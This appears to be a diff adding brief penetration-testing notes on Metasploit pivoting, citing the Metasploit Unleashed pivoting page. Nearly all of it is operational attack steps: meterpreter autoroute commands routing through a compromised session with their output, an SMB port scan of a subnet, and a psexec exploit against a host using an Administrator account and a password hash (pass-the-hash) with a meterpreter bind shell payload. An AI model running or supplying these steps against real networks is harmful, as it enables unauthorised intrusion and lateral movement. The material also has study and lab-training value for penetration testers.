@@ -1,0 +1,35 @@
+-  run autoroute -h
+- run autoroute -s 10.1.13.0/24
+-  run autoroute -p
+
+
+- run autoroute -s 192.168.55.11/24
+[*] Adding a route to 192.168.55.11/255.255.255.0...
+[+] Added route to 192.168.55.11/255.255.255.0 via 192.168.50.72
+[*] Use the -p option to list all active routes
+
+meterpreter > run autoroute -p
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   192.168.55.11      255.255.255.0      Session 4
+
+
+- use auxiliary/scanner/portscan/tcp 
+- set RHOSTS 10.1.13.0/24
+- set PORTS 139,445
+- set THREADS 50
+- run
+
+
+- use exploit/windows/smb/psexec 
+- set RHOST 10.1.13.2
+- set SMBUser Administrator
+- set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
+- set PAYLOAD windows/meterpreter/bind_tcp
+- exploit
+
+  https://www.offensive-security.com/metasploit-unleashed/pivoting/
